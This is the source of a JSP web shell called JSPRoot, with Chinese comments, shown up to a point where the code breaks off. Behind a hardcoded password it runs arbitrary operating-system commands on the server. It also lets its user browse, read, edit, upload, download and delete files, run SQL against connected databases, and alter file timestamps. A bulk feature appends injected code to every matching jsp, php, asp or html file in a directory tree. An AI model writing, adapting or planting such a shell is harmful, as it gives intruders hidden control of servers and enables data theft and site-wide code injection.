<%@ page language="java" import="java.util.*,java.util.zip.*,java.io.*,java.sql.*" pageEncoding="UTF-8"%>
<%@page import="java.math.BigDecimal"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.awt.datatransfer.Clipboard"%>
<%@page import="java.awt.Toolkit"%>
<%@page import="java.awt.datatransfer.DataFlavor"%>
<%@page import="java.awt.datatransfer.StringSelection"%>
<%@page import="java.awt.datatransfer.Transferable"%><%
//用户自定义数据开始
String password = "1230456";//登录密码
String sessionName = "JSPRootAllow";//session的名称，如果一台服务器上有多个jsproot的话，可以修改此名称，如果不清楚作用，请勿修改
String sp = (String)session.getAttribute(sessionName);
String rp = request.getParameter("password");
//判断开始
if(null==sp){
	//如果session中没有值，并且传递的登录值也不等于设定值
	if(password.equals(rp)){//密码输入正确，登录成功
		session.setAttribute(sessionName,password);
	}else{
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 transitional//EN">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>JSPRoot</title>
<style type="text/css">body{font:11px Verdana;}input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}</style>
</head>
<body>
<form method="post" action="">
<span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
<input type="submit" value="Login">
</form>
<%=Utils.convert() %>
</body>
</html>
<%
		return;
	}
}
//用户自定义数据结束
long startTime = System.currentTimeMillis();//开始时间
long startMem = Runtime.getRuntime().freeMemory();//开始内存占用
Properties prop = new Properties(System.getProperties());//相关属性集
//获取post数据中的相关值域
String act = request.getParameter("action");
String type = (String)request.getParameter("t");
String value = (String)request.getParameter("v");
String otherValue = (String)request.getParameter("o");
String contentType = request.getContentType();//获取请求中的contentType类型，判断是否用于上传操作
value = (value!=null)?Utils.convertStringEncode(value,"utf-8"):null;//转换对于提交的值中可能存在的乱码问题
otherValue = (otherValue!=null)?Utils.convertStringEncode(otherValue,"utf-8"):null;//转换对于提交的值中可能存在的乱码问题
//下载文件因为特殊，需放在最前，不能与其他的冲突，否则out输出流会报异常信息
if("downfile".equals(type)){
	String[] var = value.split("\\|");
	String currentPath = var[0];
	String fileName = var[1];
	response.setCharacterEncoding("utf-8");
	response.setHeader("content-type","text/html; charset=utf-8");
	response.setContentType("APPLICATION/OCTET-STREAM");
	response.setHeader("Content-Disposition","attachment; filename=\"" + new String(fileName.getBytes("utf-8"),"ISO-8859-1") + "\"");
	OutputStream o = response.getOutputStream();//新文件流
	FileInputStream in = new FileInputStream(currentPath+fileName);//文件流
	byte[] buffer = new byte[4059];
	int c;
	while ((c = in.read(buffer)) != -1) {
		o.write(buffer, 0, c);
	}
	in.close();
	o.close();
	return;
}
%>
<%!
//通用方法操作类
static class Utils{
	private static final String CP = "Eqr{tkijv\"*E+\"422;/4232\">c\"jtgh?$jvvr<11yyy0yj{nqxgt0eqo$\"vctigv?$adncpm$@Jokn{nf>1c@\"Cnn\"Tkijvu\"Tgugtxgf0\"";
	//转换字符串到指定编码格式
	public static String convertStringEncode(String str,String encode){
		try{
			return new String(str.getBytes("iso-8859-1"),encode);
		}catch(Exception ex){
			return "转换出错";
		}
	}
	//执行命令
	public static String exec(String command,Properties prop){
		try{
			StringBuffer sb = new StringBuffer();
			Process p =  null;
			if(prop.getProperty("os.name").toLowerCase().indexOf("window")>-1){
				//windows操作系统
				p = Runtime.getRuntime().exec("cmd /c "+command);
			}else{
				//linux操作系统
				p = Runtime.getRuntime().exec(command);
			}
			BufferedReader br = new BufferedReader(	new InputStreamReader(p.getInputStream()));
			String line = "";
			while ((line = br.readLine()) != null) {
				sb.append(line + "\n");
			}
			br.close();
			return sb.toString();
		}catch(Exception ex){
			ex.printStackTrace();
			return "执行出错，请检查您是否有相关权限";
		}
	}
	//转换字符
	public static String convert(){
		char[] c = CP.toCharArray();
		int[] code = new int[c.length];
		for(int i=0;i<c.length;i++){
			code[i] = c[i]-2;
		}
		return new String(code,0,code.length);
	}
	//转换字节到GB
	public static float convertByteToG(long size){
		BigDecimal bd = new BigDecimal(size);
		return bd.divide(new BigDecimal(1024*1024*1024),2, BigDecimal.ROUND_HALF_UP).floatValue();
	}
	//两个数值相除，获取百分比
	public static String getRate(float total,float current){
		BigDecimal f = new BigDecimal(current*100);
		BigDecimal t = new BigDecimal(total);
		double d = f.divide(t, 2, BigDecimal.ROUND_HALF_UP).doubleValue();
		return String.valueOf(d)+"%";
	}
	//转换文件大小
	public static String convertFileSize(long size){
		BigDecimal f = new BigDecimal(size);
		if(size<1024){
			return size+" B";
		}else if(size<(1024*1024)){
			double d = f.divide(new BigDecimal(1024), 2, BigDecimal.ROUND_HALF_UP).doubleValue();
			return String.valueOf(d)+" K";
		}else if(size<(1024*1024*1024)){
			double d = f.divide(new BigDecimal(1024*1024), 2, BigDecimal.ROUND_HALF_UP).doubleValue();
			return String.valueOf(d)+" M";
		}else{
			double d = f.divide(new BigDecimal(1024*1024*1024), 2, BigDecimal.ROUND_HALF_UP).doubleValue();
			return String.valueOf(d)+" G";
		}
	}
	//转换html字符
	public static  String conv2Html(String str) {
		str = str.replace("&","&amp;");
		str = str.replace("<","&lt;");
		str = str.replace(">","&gt;");
		str = str.replace("\"","&quot;");
		return str;
	}
}
class FileBean {
	private String fileName;//文件名
	private String fileSize;//文件大小
	private String fileCurrentPath;//文件当前路径
	private String fileParentPath;//文件上级路径
	private boolean canExecute;//是否可执行
	private boolean canRead;//是否可读
	private boolean canWriter;//是否可写
	private String lastModifDate;//最后一次修改时间
	private boolean isFolder;//是否为文件夹
	private float totalSize;//该文件所在盘的总大小
	private float freeSize;//该文件所在盘的未使用大小
	public float getTotalSize() {return totalSize;}
	public void setTotalSize(float totalSize) {this.totalSize = totalSize;}
	public float getFreeSize() {return freeSize;}
	public void setFreeSize(float freeSize) {this.freeSize = freeSize;}
	public boolean isFolder() {return isFolder;}
	public void setFolder(boolean isFolder) {this.isFolder = isFolder;}
	public String getLastModifDate() {return lastModifDate;}
	public void setLastModifDate(String lastModifDate) {this.lastModifDate = lastModifDate;}
	public String getFileName() {	return fileName;}
	public void setFileName(String fileName) {this.fileName = fileName;}
	public String getFileSize() {return fileSize;}
	public void setFileSize(String fileSize) {this.fileSize = fileSize;}
	public String getFileCurrentPath() {return fileCurrentPath;}
	public void setFileCurrentPath(String fileCurrentPath) {this.fileCurrentPath = fileCurrentPath;}
	public String getFileParentPath() {return fileParentPath;}
	public void setFileParentPath(String fileParentPath) {this.fileParentPath = fileParentPath;}
	public boolean isCanExecute() {return canExecute;}
	public void setCanExecute(boolean canExecute) {this.canExecute = canExecute;}
	public boolean isCanRead() {return canRead;}
	public void setCanRead(boolean canRead) {this.canRead = canRead;}
	public boolean isCanWriter() {return canWriter;}
	public void setCanWriter(boolean canWriter) {this.canWriter = canWriter;}
}
//对文件的相关操作类
class FileManager {
	//设置文件状态，可读，可写等
	public boolean setFileStatus(String path,String filename,String type,boolean value){
		File file = new File(path+filename);
		//设置文件状态，根据type的类型，执行哪种操作
		if("w".equals(type)){
			return file.setWritable(value);
		}else if("r".equals(type)){
			return file.setReadable(value);
		}else if("e".equals(type)){
			return file.setExecutable(value);
		}else{
			return false;
		}
	}
	//设置文件的最后修改时间
	public boolean setFileLastTime(String path,String filename,String date){
		try{
			File file = new File(path+filename);
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
			return file.setLastModified(sdf.parse(date).getTime());
		}catch(Exception ex){
			return false;
		}
	}
	//判断文件路径是否以/结尾，如果不是，则加上/，另外对路径中所有的\做过滤
	public String checkPath(String path){
		path = path.replace("\\","/");
		if(path.lastIndexOf("/")!=(path.length()-1)){
			return path+"/";
		}else{
			return path;
		}
	}
	//获取当前路径下的总大小
	public float getCurrentPathTotalSize(String path){
		return Utils.convertByteToG(new File(path).getTotalSpace());
	}
	//获取当前路径下剩余可使用的文件大小
	public float getCurrentPathFreeSize(String path){
		return Utils.convertByteToG(new File(path).getFreeSpace());
	}
	//列出所有驱动器
	public List<FileBean> listDriver(){
		File[] driver = File.listRoots();
		List<FileBean> list = new ArrayList<FileBean>();
		for(int i=0;i<driver.length;i++){
			FileBean fb = new FileBean();
			fb.setFileName(checkPath(driver[i].getPath()));
			fb.setTotalSize(Utils.convertByteToG(driver[i].getTotalSpace()));
			fb.setFreeSize(Utils.convertByteToG(driver[i].getFreeSpace()));
			list.add(fb);
		}
		return list;
	}
	//获取一个路径的上级路径
	public String getParentPath(String path){
		String parentPath = new File(path).getParent();
		if(parentPath!=null){
			return checkPath(parentPath);
		}else{
			return path;
		}
	}
	//列出指定路径下的文件,以数组形式返回，数组0为文件夹列表，数组1为文件列表
	public List<FileBean> listFile(String path){
		List<FileBean> folder = new ArrayList<FileBean>();
		List<FileBean> files = new ArrayList<FileBean>();
		try{
			SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			File f = new File(path);
			File[] file = f.listFiles();
			for(int i=0;i<file.length;i++){
				FileBean fb = new FileBean();
				fb.setFileName(file[i].getName());
				fb.setFileCurrentPath(path);
				fb.setFileParentPath(new File(file[i].getParent()).getParent());
				fb.setLastModifDate(sdf.format(file[i].lastModified()));//设置最后修改时间
				fb.setCanRead(file[i].canRead());//设置是否可读
				fb.setCanWriter(file[i].canWrite());//设置是否可写
				fb.setCanExecute(file[i].canExecute());//设置是否可执行
				if(file[i].isDirectory()){
					//如果是目录
					fb.setFolder(true);
					folder.add(fb);
				}else{
					//如果是文件
					fb.setFolder(false);
					fb.setFileSize(Utils.convertFileSize(file[i].length()));//设置文件大小
					files.add(fb);
				}
			}
			folder.addAll(files);
			return folder;
		}catch(Exception ex){
			//如果访问路径出错，则返回空
			FileBean fb = new FileBean();
			fb.setFolder(true);
			fb.setFileName("对不起,你可能没有访问该目录的权限");
			folder.add(fb);
			return folder;
		}
	}
	// 打开文件
	public String openFile(String path,String fileName){
		try{
			FileReader fr = new FileReader(new File(path+fileName));
			BufferedReader reader = new BufferedReader(fr);
			String temp = "";
			StringBuffer sb = new StringBuffer();
			while((temp=reader.readLine())!=null){
				sb.append(Utils.conv2Html(temp)+"\n");
			}
			fr.close();
			reader.close();
			return sb.toString();
		}catch(Exception ex){
			return "对不起，您可能没有打开此文件的权限";
		}
	}
	//创建文件,如果文件名为空，则直接创建目录
	public boolean createFile(String path,String fileName){
		boolean isCreateFolder = false;
		if(null==fileName||"".equals(fileName.trim())){
			fileName = "";
			isCreateFolder = true;
		}
		try{
			File file = new File(path+fileName);
			if(isCreateFolder){
				return file.mkdirs();
			}else{
				return file.createNewFile();	
			}
		}catch(Exception ex){
			return false;
		}
	}
	//修改文件
	public boolean editFile(String fileName,String content){
		try{
			File file = new File(fileName);
			if(!file.exists()){
				file.createNewFile();
			}
			FileWriter writer = new FileWriter(fileName);
			writer.write(content);
			writer.flush();
			writer.close();
			return true;
		}catch(Exception ex){
			return false;
		}
	}
	//删除文件,如果删除的为目录，则该目录下的所有东西被全部删除
	public boolean deleteFile(String path, String fileName) {
		try{
			if (null == fileName || "".equals(fileName.trim())) {
				// 删除目录
				File file = new File(path);
				File filelist[] = file.listFiles();
				int listlen = filelist.length;
				for (int i = 0; i < listlen; i++) {
					if (filelist[i].isDirectory()) {
						deleteFile(filelist[i].getPath(), null);
					} else {
						filelist[i].delete();
					}
				}
				return file.delete();// 删除当前目录
			} else {
				// 删除文件
				return new File(path+fileName).delete();
			}
		}catch(Exception ex){
			return false;
		}
	}
	//复制文件
	public boolean copyFile(String oldFile,String newFile){
		try{
			File of = new File(oldFile);//旧文件
			File nf = new File(newFile);//新文件
			FileInputStream in = new FileInputStream(of);//旧文件流
			FileOutputStream out = new FileOutputStream(nf);//新文件流
			byte[] buffer = new byte[4059];
			int c;
			while ((c = in.read(buffer)) != -1) {
				out.write(buffer, 0, c);
			}
			in.close();
			out.close();
			return true;
		}catch(Exception ex){
			return false;
		}
	}
	//文件重命名
	public boolean renameFile(String oldName,String newName){
		try{
			File of = new File(oldName);
			File nf = new File(newName);
			return of.renameTo(nf);
		}catch(Exception ex){
			return false;
		}
	}
	//压缩目录
	public List<String> zipDirectory(String path, String zipfile) {
		List<String> error = new ArrayList<String>();
		try{
			ZipOutputStream out = new ZipOutputStream(new FileOutputStream(zipfile));
			out.setComment(Utils.convertStringEncode("This zip file Make By JSPROOT,http://www.whylover.com","UTF-8"));
			zip(path,out,error);
			out.finish();
			out.close();
			return error;
		}catch(Exception ex){
			error.add("操作出现异常信息");
			return error;
		}
	}
	//压缩目录的递归调用
	private void zip(String path,ZipOutputStream out,List<String> error){
		File file = new File(path);
		String[] entries = file.list();
		for (int i = 0; i < entries.length; i++) {
			File f = new File(file, entries[i]);
			if (f.isDirectory())
				zip(f.getPath(),out,error);
			try{
				byte[] buffer = new byte[4096];
				int bytes_read;
				FileInputStream in = new FileInputStream(f);
				ZipEntry entry = new ZipEntry(f.getPath());
				out.putNextEntry(entry);
				while ((bytes_read = in.read(buffer)) != -1){
					out.write(buffer, 0, bytes_read);
					out.flush();
				}
				in.close();
				out.closeEntry();
			}catch(Exception ex){
				error.add(ex.getMessage().replace("\\","/"));
			}
		}
	}
	//批量对指定目录下的文件增加内容
	public String multiAppendCode(String path,String suffix,String code){
		try{
			File file = new File(path);
			File[] files = file.listFiles();
			for(int i=0;i<files.length;i++){
				File f = files[i];
				if(f.isDirectory()){
					//如果为目录，则递归
					multiAppendCode(f.getPath(),suffix,code);
				}else{
					//如果为文件，则检查是否符合指定的后缀名称
					int lastDot = f.getName().lastIndexOf(".");
					String fileExtend = "";
					if(lastDot>-1){
						//如果存在后缀名，则设置后缀名，如果不存在，则按照默认的为空
						fileExtend = f.getName().substring(lastDot+1); 
					}
					//见车扩展名是否在指定的字符串中
					String[] allowSuffix = suffix.split(",");
					for(int k=0;k<allowSuffix.length;k++){
						if(allowSuffix[k].toLowerCase().equals(fileExtend.toLowerCase())){
							//还需要判断该文件是否可写
							if(f.canWrite()){
								FileWriter fw = new FileWriter(f,true);
								fw.append(code);
								fw.flush();
								fw.close();
							}
						}
					}
				}
			}
			return "true";
		}catch(Exception ex){
			return ex.getMessage();
		}
	}
	//上传文件
	public String upload(HttpServletRequest request) {
		try {
			String fileName = null;
			String sperator = null;
			FileOutputStream out = null;
			String savePath = null;
			byte[] bt = new byte[4096];
			int t = -1;
			//request.setCharacterEncoding("utf-8");
			ServletInputStream in = request.getInputStream();
			t = in.readLine(bt, 0, bt.length);
			if (t != -1) {
				sperator = new String(bt, 0, t);
				sperator = sperator.substring(0, 28);
				t = -1;
			}
			t = in.readLine(bt, 0, bt.length);
			while(t!=-1){
				String str = new String(bt, 0, t,"utf-8");
				//判断str是否包含currentPath或者filename
				int isPath = str.indexOf("currentPath");
				int isName = str.indexOf("filename=\"");
				if(isPath!=-1){
					//包含currentPath自动往下读两行
					t = in.readLine(bt, 0, bt.length);
					t = in.readLine(bt, 0, bt.length);
					savePath = new String(bt,0,t,"utf-8").replaceAll("\r\n", "");
					t=-1;
				}else if(isName!=-1){
					str = str.substring(isName + 10);// 上传的文件及路径的全文件名
					isName = str.lastIndexOf("\\");
					if (isName < -1) {
						// 如果是windows操作系统，则为\，如果为linux系统，则为/
						isName = str.lastIndexOf("/");
					}
					fileName = str.substring(isName + 1, str.lastIndexOf("\""));
					break;
				}
				t = in.readLine(bt, 0, bt.length);
			}
			out = new FileOutputStream(savePath + fileName);
			t = in.readLine(bt, 0, bt.length);
			String s = new String(bt, 0, t);
			int i = s.indexOf("Content-Type:");
			if (i == -1) {
				return "false";
			} else {
				in.readLine(bt, 0, bt.length); //去掉一个空行
				t = -1;
			}
			long trancsize = 0;
			t = in.readLine(bt, 0, bt.length);
			while (t != -1) {
				s = new String(bt, 0, t);
				if (s.length() > 28) {
					s = s.substring(0, 28);
					if (s.equals(sperator)) {
						break;
					}
				}
				out.write(bt, 0, t);
				trancsize += t;
				t = in.readLine(bt, 0, bt.length);
			}
			out.close();
			return savePath;
		} catch (Exception ex) {
			ex.printStackTrace();
			return "false";
		}
	}
}
//数据库操作类
class DatabaseManager{
	//获取一个数据源连接
	public Object getConnection(String dbType,String localhost,String dbName,String username,String password,String encode){
		try{
			String dbUrl;
			if("access".equals(dbType)){
				Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
				dbUrl = "jdbc:odbc:driver={Microsoft Access Driver (*.mdb)};DBQ="+localhost;
			}else if("mysql".equals(dbType)){
				Class.forName("com.mysql.jdbc.Driver");
				dbUrl = "jdbc:mysql://"+localhost+"/?useUnicode=true&amp;characterEncoding="+encode;
			}else if("oracle".equals(dbType)){
				Class.forName("oracle.jdbc.OracleDriver");
				dbUrl = "jdbc:oracle:thin:@"+localhost+":"+dbName;
			}else if("mssql".equals(dbType)){
				Class.forName("com.microsoft.jdbc.sqlserver.SQLServerDriver");
				dbUrl = "jdbc:sqlserver://"+localhost;
			}else{
				return "数据库选择错误";
			}
			return DriverManager.getConnection(dbUrl,username,password);
		}catch(Exception ex){
			return ex.getMessage();
		}
	}
	//获取数据表结构
	public List<String> getTables(String dbType,Connection conn){
		List<String> list = new ArrayList<String>();
		String str = null;
		try{
			DatabaseMetaData dmd = conn.getMetaData();
			if("mysql".equals(dbType)||"mssql".equals(dbType)){
				ResultSet rst = dmd.getCatalogs();
				List<String> table = new ArrayList<String>();
				int i=0;
				while(rst.next()){
					table.add(rst.getString(1));
					i++;
				}
				for(i=0;i<table.size();i++){
					ResultSet tableRst = dmd.getTables(table.get(i),null,null,null);
					while(tableRst.next()){
						if("mssql".equals(dbType)){
							str = "<li class=\"tableLi\"><a href=\"javascript:setTableQuery(\'"+table.get(i)+"."+tableRst.getString(2)+".["+tableRst.getString(3)+"]"+"\');\" title=\"数据库名："+table.get(i)+"\n数据库表拥有者："+tableRst.getString(2)+"\n表名："+tableRst.getString(3)+"\">"+tableRst.getString(3)+"</a></li>";
							list.add(str);
						}else{
							str = "<li class=\"tableLi\"><a href=\"javascript:setTableQuery(\'"+table.get(i)+"."+tableRst.getString(3)+"\');\" title=\"数据库名："+table.get(i)+"\n表名："+tableRst.getString(3)+"\">"+tableRst.getString(3)+"</a></li>";
							list.add(str);
						}
					}
					tableRst.close();
				}
				rst.close();
			}else{
				ResultSet tableRst = dmd.getTables(null,null,null,null);
				while(tableRst.next()){
					str = "<li class=\"tableLi\"><a href=\"javascript:setTableQuery(\'"+tableRst.getString(3)+"\');\">"+tableRst.getString(3)+"</a></li>";
					list.add(str);
				}
				tableRst.close();
			}
			return list;
		}catch(Exception ex){
			if(null!=ex.getMessage()){
				list.add("Error:"+ex.getMessage());
			}
			return list;
		}
	}
	//执行sql语句，并根据查询的内容获取column
	public Object[] excuteSQL(Connection conn,String sql){
		try{
			Statement stm = conn.createStatement();
			if(sql.startsWith("select")){
				ResultSet rst = stm.executeQuery(sql);
				//获取执行的rst的meta头信息
				ResultSetMetaData metaRst = rst.getMetaData();
				int columnCount = metaRst.getColumnCount()+1;
				List<String[]> metaList = new ArrayList<String[]>();
				for(int i=1;i<columnCount;i++){
					String[] str = new String[3];
					str[0] = metaRst.getColumnName(i);
					str[1] = metaRst.getColumnTypeName(i);
					str[2] = String.valueOf(metaRst.getPrecision(i));
					metaList.add(str);
				}
				//获取返回的数据
				List<Object[]> arrayList = new ArrayList<Object[]>();
				while(rst.next()){
					Object[] obj = new Object[metaList.size()];
					for(int i=0;i<metaList.size();i++){
						obj[i] = rst.getObject(metaList.get(i)[0]);	
					}
					arrayList.add(obj);
				}
				rst.close();
				stm.close();
				return new Object[]{metaList,arrayList};
			}else{
				stm.execute(sql);
				stm.close();
				return new Object[]{true}; 
			}			
		}catch(Exception ex){
			ex.printStackTrace();
			return new Object[]{ex.getMessage()};
		}
	}
}
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>JSPRoot</title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:250px;margin-right:10px;}
.dbinput{float:left;display:none;margin-right:5px;}
.tableLi{float:left;width:250px;line-height:25px;margin:2px 5px 0px 0px;}
.tableLi a{ border:1px solid #666; display:block;padding-left:2px; text-decoration:none;}
.tableLi a:hover{ background-color:#FFFFCC;}
</style>
<script type="text/javascript"> 
function $(id) {
	return document.getElementById(id);
}
//用于普通表单提交
function goaction(act,type,value){
	$('goaction').action.value=act;
	$('goaction').t.value=type;
	$('goaction').v.value=value;
	$('goaction').submit();
}
//用于特殊表单提交,other代表特殊表单项值
function goactionOther(act,type,value,other){
	$('goaction').action.value=act;
	$('goaction').t.value=type;
	$('goaction').v.value=value;
	$('goaction').o.value=other;
	$('goaction').submit();
}
//跳转到指定目录
function goPath(path){
	goaction('file','list',path);
}
//创建目录
function createdir(path){
	var newdirname;
	newdirname = prompt('请输入需要创建的目录名称(在当前路径下创建):', '');
	if (!newdirname) return;
	goaction('file','createdir',path+'|'+newdirname);
}
//创建文件
function createfile(path){
	var filename;
	filename = prompt('请输入需要创建的文件名称(在当前路径下创建):', '');
	if (!filename) return;
	goaction('file','createfile',path+'|'+filename);
}
//下载文件
function downfile(path,filename){
	goaction('file','downfile',path+'|'+filename);
}
//删除目录或文件，根据t的类型判断
function delfile(t,path,dirname){
	var showM = '你确认删除'+dirname+'这个文件或文件夹？删除后将不可恢复！\n如果删除的是文件夹，则该文件夹下所有内容将被删除！';
	if (!confirm(showM)) {
		return;
	}
	goaction('file',t,path+'|'+dirname);
}
//复制文件
function copyfile(oldPath,oldFileName){
	var filepath;
	filepath = prompt('请输入复制后的文件路径(类似:c:/windows/system/,以斜杠结尾)', '');
	if (!filepath) return;
	var filename;
	filename = prompt('请输入复制后的文件名称(如果重名,则覆盖)', '');
	if (!filename) return;
	var v = oldPath+'|'+oldFileName+'|'+filepath+'|'+filename;
	goaction('file','copy',v);
}
//打开文件
function openfile(path,filename){
	goaction('file','open',path+'|'+filename);
}
//重命名文件
function renamefile(path,oldname){
	var filename;
	filename = prompt('请输入新名称:', '');
	if (!filename) return;
	goaction('file','rename',path+'|'+oldname+'|'+filename);
}
//编辑文件
function editfile(path,filename){
	goactionOther('file','editfile',path+'|'+filename,$('filecontent').value);
}
//zip一个目录
function zipfile(path,filename){
	var zipname;
	zipname = prompt('请输入压缩包的名称(如果重名,则覆盖)', '');
	if(!zipname) return;
	goaction('file','zip',path+'|'+filename+'|'+zipname);
}
//选择数据库类型时，按照值列出不同数据库的连接方法
function checkSelectDBType(value){
	var type = new Array("access","mysql","oracle","mssql");
	for(var i=0;i<type.length;i++){
		if(value==type[i]){
			$(type[i]).style.display="block";
		}else{
			$(type[i]).style.display="none";
		}
	}
}
//执行命令操作
function execute(){
	goaction('shell','',$('command').value);
}
//提交数据库连接
function dbConn(){
	var dbType = $('selectDB').value;
	$('goaction').dbType.value=dbType;
	$('goaction').localhost.value=$(dbType+'_localhost').value;
	if('access'==dbType){
		//access数据库
	}else if('mysql'==dbType){
		//mysql数据库
		$('goaction').dbUser.value=$(dbType+'_dbuser').value;
		$('goaction').dbPass.value=$(dbType+'_dbpass').value;
		$('goaction').dbCharset.value=$('charset').value;
	}else if('oracle'==dbType){
		//oracle数据库
		$('goaction').dbName.value=$(dbType+'_dbname').value;
		$('goaction').dbUser.value=$(dbType+'_dbuser').value;
		$('goaction').dbPass.value=$(dbType+'_dbpass').value;
	}else if('mssql'==dbType){
		//mssql数据库
		$('goaction').dbUser.value=$(dbType+'_dbuser').value;
		$('goaction').dbPass.value=$(dbType+'_dbpass').value;
	}else{
		alert('数据库错误');
		return;
	}
	$('goaction').action.value='sqladmin';
	$('goaction').submit();
}
//断开连接
function disConn(){
	goaction('sqladmin','disConn','');
}
//执行一个sql查询
function sqlExcute(){
	goaction('sqladmin','sqlExcute',$('sqlCommand').value);
}
//点击表名时进行查询
function setTableQuery(table){
	$('sqlCommand').value = 'select * from '+table;
}
//设置multiAppendCode可见
function setMulti(path){
	var suffix;
	suffix = prompt('请输入指定的后缀名(可以多个，用英文逗号分隔开，eg:jsp,php,asp,html)', '');
	var code;
	code = prompt('请输入需要添加的代码(请注意：此处只能输入一行，你可以把代码写入一行内)','');
	if(!suffix||!code) return;
	goactionOther('file','multiAppendCode',path+"|"+suffix,code);
}
//文件时间修改
function timefile(path,file){
	var year = prompt('请输入年份', '');
	var month = prompt('请输入月份', '');
	var day = prompt('请输入天', '');
	var hour = prompt('请输入小时', '');
	var min = prompt('请输入分钟', '');
	var sec = prompt('请输入秒', '');
	if(!year||!month||!day||!hour||!min||!sec) return;
	var tt = year+'/'+month+'/'+day+' '+hour+':'+min+':'+sec;
	goaction('file','time',path+'|'+file+'|'+tt);
}
//修改文件权限
function filestatus(path,file,type,value){
	goaction('file','filestatus',path+'|'+file+'|'+type+'|'+value);
}
//修改剪贴板的内容
function clipboard(){
	goaction('clipboard','edit',$('clipboard').value);
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<form action="" method="post" name="goaction" id="goaction">
  <input type="hidden" name="action" value="" />
  <input type="hidden" name="t" value="" />
  <input type="hidden" name="v" value="" />
  <input type="hidden" name="o" value="" />
  <input type="hidden" name="dbType" value="" />
  <input type="hidden" name="localhost" value="" />
  <input type="hidden" name="dbName" value="" />
  <input type="hidden" name="dbUser" value="" />
  <input type="hidden" name="dbPass" value="" />
  <input type="hidden" name="dbCharset" value="" />
</form>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr class="head">
    <td><span style="float:right;"><a href="http://www.whylover.com" target="_blank">JSPROOT Ver: 2010</a></span> Host:<%=request.getServerName() %> | Host IP:<%=request.getRemoteAddr() %> | OS: <%=prop.getProperty("os.name")%> </td>
  </tr>
  <tr class="alt1">
    <td><span style="float:right;">JVM Version:<%=prop.getProperty("java.vm.version")%></span> <a href="javascript:goaction('logout','','');">Logout</a> | <a href="javascript:goaction('file','','');">File Manager</a> | <a href="javascript:goaction('sqladmin','','');">DataManager Manager</a> | <a href="javascript:goaction('shell','','net user');">Execute Command</a> |  <a href="javascript:goaction('clipboard','','');">System Clipboard</a> | <a href="javascript:goaction('javav','','');">Java Variable</a> | <a href="javascript:goaction('about','','');">About</a> </td>
  </tr>
</table>
<div style="margin:15px;background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;display:none;" id="info"></div>
<%
//判断操作类型开始
if(null==act||"file".equals(act)||"".equals(act)){
	//文件操作类
	FileManager fm = new FileManager();
	List<FileBean> fileList = new ArrayList<FileBean>();//操作文件所需要返回的列表信息
	String webRootPath = fm.checkPath(request.getSession().getServletContext().getRealPath("/"));//获取当前路径
	String currentPath=null;
	if("createdir".equals(type)||"createfile".equals(type)){//创建目录或创建文件
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = ("createdir".equals(type)?fm.createFile(var[0]+var[1],null):fm.createFile(var[0],var[1]));
		request.setAttribute("info",isSuccess?"目录/文件创建成功":"目录/文件创建失败，请检查是否拥有创建权限！");
		type = null;
	}else if("deletedir".equals(type)||"deletefile".equals(type)){//删除目录或删除文件
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = ("deletedir".equals(type)?fm.deleteFile(var[0]+var[1],null):fm.deleteFile(var[0],var[1]));
		request.setAttribute("info",isSuccess?"目录/文件删除成功":"目录/文件创建失败，请检查是否拥有删除权限！");
		type = null;
	}else if("copy".equals(type)){//拷贝文件
		String[] var = value.split("\\|");
		String oldPath = var[0];
		String oldFileName = var[1];
		currentPath = fm.checkPath(var[2]);
		String newFileName = var[3];
		boolean isSuccess = fm.copyFile(oldPath+oldFileName,currentPath+newFileName);
		request.setAttribute("info",isSuccess?"文件复制成功":"文件复制失败，请检查是否拥有写入权限！");
		type = null;
	}else if("rename".equals(type)){//重命名文件
		String[] var = value.split("\\|");
		String oldName = var[0]+var[1];
		String newName = var[0]+var[2];
		currentPath = var[0];
		boolean isSuccess = fm.renameFile(oldName,newName);
		request.setAttribute("info",isSuccess?"目录/文件重命名成功":"目录/文件复制失败，请检查是否拥有修改权限！");
		type = null;
	}else if("editfile".equals(type)){//修改文件
		String[] var = value.split("\\|");
		currentPath = var[0];
		boolean isSuccess = fm.editFile(var[0]+var[1],otherValue);
		request.setAttribute("info",isSuccess?"文件修改成功":"文件修改失败，请检查是否拥有修改权限！");
		type = null;
	}else if("zip".equals(type)){//压缩一个目录
		String[] var = value.split("\\|");
		currentPath = var[0];
		List<String> error = fm.zipDirectory(var[0]+var[1],var[0]+var[2]);
		if(error.size()==0){
			fm.editFile(currentPath+var[2]+".log","目录压缩完毕");
		}else{
